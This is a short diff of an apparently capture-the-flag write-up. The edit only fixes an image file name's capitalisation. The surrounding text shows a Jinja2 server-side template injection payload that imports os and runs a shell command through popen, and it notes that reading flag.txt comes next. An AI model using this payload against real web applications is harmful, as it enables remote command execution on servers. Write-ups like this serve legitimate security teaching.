@@ -37,7 +37,7 @@ now try this command:
 ```
 {{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}
 ```
-![Response to edited url second time](./URL-change-response2.PNG)
+![Response to edited url second time](./URL-Change-Response2.PNG)
 
 looking at the files returned, we can just cat flag.txt as that will contain our flag using:
 
